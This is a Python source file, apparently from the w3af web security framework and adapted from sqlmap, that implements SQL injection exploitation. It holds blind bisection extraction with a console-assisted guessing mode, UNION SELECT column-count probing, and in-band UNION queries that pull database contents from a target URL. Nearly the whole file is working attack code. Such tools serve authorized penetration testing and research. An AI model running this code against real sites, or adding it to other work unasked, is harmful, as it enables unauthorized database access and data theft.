'''
dbDriverFunctions.py

This file was part of sqlmap, I ( Andres Riancho ), adapted it to work with w3af.
License: GPL v2.
'''

import core.controllers.outputManager as om
from core.controllers.w3afException import w3afException
import core.data.parsers.urlParser as urlParser
from core.controllers.threads.threadManager import threadManagerObj as tm
import core.data.kb.config as cf

import urllib
import time
import os
import random


class args:
    '''
    This is a helper class to store all parameters in a way sqlmap understands.
    '''
    tbl = None
    db = None
    injectionMethod = None
    trueResult = None
    exaustiveFp = None
    col = None
    getBanner = None
    unionUse = None
    string = None
    injParameter = None
    resumedQueries = {}
    verbose = True


class dbDriverFunctions:
    '''
    This class stores all database driver methods.
    
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''
    def __init__(self, cmpFunction):
        self._cmpFunction = cmpFunction
        self.args = args()
        
        # All needed for the good samaritan
        self._goodSamaritan = []
        self._tm = tm
        self._runningGS = False
        self._load_autocomplete_strings()
        self._previous_results = []
        
    def _load_autocomplete_strings(self):
        '''
        This will load a list of autocomplete strings that will make blind sql injection
        exploitation faster. (i hope)
        '''
        self._autocomplete_strings = []
        
        string_file = os.path.join('plugins', 'attack', 'db', 'autocomplete.txt')
        for line in file(string_file):
            line = line.strip()
            if line:
                self._autocomplete_strings.append( line )
    
    def isRunningGoodSamaritan( self ):
        return self._runningGS

    def startGoodSamaritan( self ):
        om.out.debug('\r\nStarting good samaritan module, please help the blind man find his way.')
        self._runningGS = True
    
    def stopGoodSamaritan( self ):
        if self._runningGS:
            om.out.debug('\r\nStopping good samaritan module.')
            self._tm.join( self )
            self._runningGS = False
        
    def goodSamaritanContribution( self, contribution ):
        '''
        A good samaritan typed something to the console and now I can use it to help the blind process.
        '''
        om.out.console('Good samaritan contributed with: "' + contribution.strip('\n\r') + '"' )
        self._goodSamaritan.append( contribution.strip('\n\r') )
    
    def info(self, message):
        """
        Print a log message if verbose is enabled.
        """
        om.out.information( "[%s] [INFO] %s" % (time.strftime("%X"), message) )

    def log(self, message):
        """
        Print a log message if verbose is enabled.
        """
        om.out.debug( "[%s] [LOG] %s" % (time.strftime("%X"), message) )

    def warn(self, message):
        """
        Print a warning message if verbose is enabled.
        """
        om.out.error( "[WARN] %s" % message)

    def urlReplace(self, parameter="", value="", newValue=""):
        mutant = self._vuln.getMutant()
        mutant.setModValue( self._vuln['falseValue'] + newValue )
        
        if mutant.getDc() != '':
            baseUrl = urlParser.uri2url( mutant.getURL() ) + '?' + urllib.unquote_plus( str( mutant.getDc() ) )
        else:
            baseUrl = mutant.getURL()
        return baseUrl

    def getPage(self, url):
        """
        Connect to the target url or proxy and return the target
        url page.
        """
        m = self._vuln.getMutant()
        m.setDc( urlParser.getQueryString( url ) )
        m.setURL( urlParser.uri2url( url ) )
        response = self._sendMutant( m , analyze=False )
        if response.getCode() in range( 500, 599 ):
            raise w3afException('getPage request returned an HTTP error 500.')
        return response.getBody()

    def queryPage(self, url):
        """
        Call getPage() function to get the target url page and return
        its page MD5 hash or boolean value in case of string match check.
        """
        page = self.getPage(url)

        if not self.args.string:
            return page
        elif self.args.string in page:
            return True
        else:
            return False


    def bisectionAlgorithm(self, evilStm, exactEvilStm, expr, logMsg=True):
        baseUrl = self.urlReplace(newValue=evilStm)

        count = 0
        index = 0
        value = ""
        end = False
        rmFirstChar = True
        
        while end != True:
            index += 1
            max = 127
            min = 0

            if self._goodSamaritan:
                for to_test in self._goodSamaritan:
                    # A good samaritan typed something in the console to help me!
                    if rmFirstChar:
                        to_test_parsed = to_test[1:]
                    else:
                        to_test_parsed = to_test
                        rmFirstChar = True
                    
                    to_test_escaped = self.unescape("'"+to_test_parsed+"'")
                    exactEvilStm = exactEvilStm % (expr, index, len(to_test_parsed) , 'repla00ce_me_please')
                    exactEvilStm = exactEvilStm.replace("'repla00ce_me_please'", to_test_escaped)
                    evilUrl = self.urlReplace(newValue=exactEvilStm)
                    evilResult = self.queryPage(evilUrl)
                    
                    if self._cmpFunction( evilResult, self.args.trueResult ):
                        value += to_test_parsed
                        if len(to_test_parsed) != 1:
                            index += len(to_test_parsed) - 1
                        om.out.console('\r\nGOOD guess: "%s", current blind string is: "%s"' % (value, value))
                        om.out.console('\rgoodSamaritan('+value+')>>>', newLine=False)
                    else:
                        om.out.console( '\r\nBad guess: "%s"' % to_test )
                        index -= 1
                
                # Continue with next character 
                self._goodSamaritan = []
                continue
            
            # Now some predictive text which is automatically added...
            # value is the variable that holds whatever we've already fetched from the DB
            if len(value) == 4:
                for autocomplete in self._autocomplete_strings:
                    if autocomplete.startswith( value ):
                        self._goodSamaritan.append(autocomplete[4:])
            
            while (max - min) != 1:
                
                # someone contributed
                if self._goodSamaritan:
                    # Go to the good samaritan algorithm above
                    index -= 1
                    rmFirstChar = False
                    break
                    
                count += 1
                limit = ((max + min) / 2)
                
                evilUrl = baseUrl % (expr, index, 1, limit)
                try:
                    evilResult = self.queryPage(evilUrl)
                except w3afException, w3:
                    try:
                        evilResult = self.queryPage(evilUrl)
                    except w3afException, w3:
                        return count, value+'__incomplete exploitation__'

                if self._cmpFunction( evilResult, self.args.trueResult ):
                    min = limit
                else:
                    max = limit

                if (max - min) == 1:
                    if max == 1:
                        end = True
                        break

                    val = chr(min + 1)
                    value = value + val
                    
                    if self._runningGS and cf.cf.getData( 'demo'  ):
                        time.sleep(1.4)
                        
                    if self.args.verbose :
                        self.log( 'bisectionAlgorithm found new char: "' + val + '" ; ord(val) == ' + str(ord(val)) )
                        self.log( 'bisectionAlgorithm found value: "' + value + '" ; len(value) == ' + str(len(value)) )
                        if self._runningGS:
                            om.out.console('\r'+' '*40, newLine = False)
                            om.out.console('\rgoodSamaritan('+value+')>>>', newLine=False)
        
        self.log( 'bisectionAlgorithm final value: "' + value + '"' )
        
        #
        #   I'm going to keep track of the results, and if I see one that repeats more than once,
        #   I'm adding it to the self._autocomplete_strings list.
        #
        if value in self._previous_results:
            self._autocomplete_strings.append(value)
            self._autocomplete_strings = list(set(self._autocomplete_strings))
        else:
            if len(value) >= 4:
                self._previous_results.append(value)
        
        return count, value


    def getValue(self, expression):
        logMsg = "query: %s" % expression
        self.log(logMsg)

        start = time.time()
        
        expr = self.unescape(expression)
        
        evilStm = self.createStm()
        exactEvilStm = self.createExactStm()
        
        # This is kept here just for reference. This is from the original sqlmap code.
        '''
        if self.args.resumedQueries:
            if self.args.url in self.args.resumedQueries.keys():
                if expression in self.args.resumedQueries[self.args.url].keys():
                    value = self.args.resumedQueries[self.args.url][expression]

                    logMsg = "resumed from file '%s': %s" % (self.args.outputFile, value)
                    self.log(logMsg)

                    return value

        if self.args.writeFile:
            self.args.writeFile.write("%s::%s::" % (self.args.url, expression))
            self.args.writeFile.flush()
        '''
        
        count, value = self.bisectionAlgorithm(evilStm, exactEvilStm, expr)
        duration = int(time.time() - start)

        logMsg = "performed %d queries in %d seconds" % (count, duration)
        self.log(logMsg)

        return value


    def parseFp(self, dbms, fingerprint):
        fp = dbms

        if len(fingerprint) == 0:
            return "%s" % fp
        elif len(fingerprint) == 1:
            return "%s %s" % (fp, fingerprint[0])
        else:
            for value in fingerprint:
                fp += " %s and" % value

            return fp[:-4]


    def unionCheck(self):
        logMsg  = "testing UNION SELECT statement on "
        logMsg += "parameter '%s'" % self.args.injParameter
        self.log(logMsg)

        resultDict = {}

        if self.args.injectionMethod == "numeric":
            stm = " UNION SELECT NULL"
        elif self.args.injectionMethod == "stringsingle":
            stm = "' UNION SELECT NULL"
        elif self.args.injectionMethod == "stringdouble":
            stm = '" UNION SELECT NULL'

        for i in range(100):
            if self.args.injectionMethod == "numeric":
                checkStm = stm
            elif self.args.injectionMethod == "stringsingle":
                checkStm = stm + ", '1"
            elif self.args.injectionMethod == "stringdouble":
                checkStm = stm + ', "1'

            baseUrl = self.urlReplace(newValue=checkStm)
            newResult = self.queryPage(baseUrl)

            if not newResult in resultDict.keys():
                resultDict[newResult] = (1, stm)
            else:
                resultDict[newResult] = (resultDict[newResult][0] + 1, stm)

            stm += ", NULL"

            if i:
                for element in resultDict.values():
                    if element[0] == 1:
                        if self.args.httpMethod == "GET":
                            value = baseUrl

                            if not self.args.injectionMethod == "numeric":
                                value = baseUrl.replace("SELECT NULL,", "SELECT")

                            self.args.unionCount = value.count("NULL")

                            return value
                        elif self.args.httpMethod == "POST":
                            url = baseUrl.split("?")[0]
                            data = baseUrl.split("?")[1]
                            value = "url:\t'%s'" % url

                            if not self.args.injectionMethod == "numeric":
                                data = data.replace("SELECT NULL,", "SELECT")

                            value += "\ndata:\t'%s'\n" % data

                            self.args.unionCount = data.count("NULL")

                            return value

        return None


    def prepareUnionUse(self, expression, exprPosition):
        if self.args.injectionMethod == "numeric":
            stm = " UNION SELECT "
        elif self.args.injectionMethod == "stringsingle":
            stm = "' UNION SELECT "
        elif self.args.injectionMethod == "stringdouble":
            stm = '" UNION SELECT '

        for element in range(self.args.unionCount):
            if element > 0:
                stm += ", "

            if element == exprPosition:
                stm += "%s" % expression
            else:
                stm += "NULL"

        if self.args.injectionMethod == "stringsingle":
            stm = stm + ", '1"
        elif self.args.injectionMethod == "stringdouble":
            stm = stm + ', "1'

        return stm


    def unionUse(self, expression):
            count = 0
            start = time.time()

            warnMsg  = "the target url is not affected by an inband "
            warnMsg += "SQL injection vulnerability or your "
            warnMsg += "expression is wrong"

            if not self.args.unionCount:
                checkUnion = self.unionCheck()

                if checkUnion:
                    index = checkUnion.index("UNION")
                    splittedUrl = checkUnion[index:]
                    self.args.unionCount = splittedUrl.count("NULL")
                else:
                    self.warn(warnMsg)
                    return self.getValue(expression)

            if not self.args.unionCount:
                self.warn(warnMsg)
                return self.getValue(expression)

            for exprPosition in range(self.args.unionCount):
                randInteger = str(random.randint(10000, 99999))
                randString = "'%s'" % str(random.randint(10000, 99999))

                for randValue in (randInteger, randString):
                    # Perform a request using the UNION SELECT statement
                    # to check it the target url is affected by an
                    # inband SQL injection vulnerability
                    stm = self.prepareUnionUse(randValue, exprPosition)
                    baseUrl = self.urlReplace(newValue=stm)
                    resultPage = self.getPage(baseUrl)

                    count += 1

                    # TODO: improve the second if condition (works it the
                    # web application is written in PHP, check others)
                    randValueReplaced = randValue.replace("'", "")
                    if randValueReplaced in resultPage and "Warning" not in resultPage:
                        # Parse the returned page to get the randValue value
                        startPosition = resultPage.index(randValueReplaced)
                        endPosition = startPosition + len(randValueReplaced)
                        endCharacters = resultPage[endPosition:endPosition + 10]

                        # Perform the expression request then parse the
                        # returned page to get the expression output
                        stm = self.prepareUnionUse(expression, exprPosition)
                        baseUrl = self.urlReplace(newValue=stm)
                        resultPage = self.getPage(baseUrl)

                        # TODO: improve this check (works it the web
                        # application is written in PHP, check others)
                        if "Warning" in resultPage:
                            continue

                        try:
                            startPage = resultPage[startPosition:]
                            endPosition = startPage.index(endCharacters)
                        except:
                            continue

                        count += 1
                        duration = int(time.time() - start)

                        logMsg = "request: %s" % baseUrl
                        self.log(logMsg)

                        logMsg  = "the target url is affected by an "
                        logMsg += "inband SQL injection vulnerability"
                        self.log(logMsg)

                        logMsg = "performed %d queries in %d seconds" % (count, duration)
                        self.log(logMsg)

                        return str(startPage[:endPosition])

            self.warn(warnMsg)
            return self.getValue(expression)
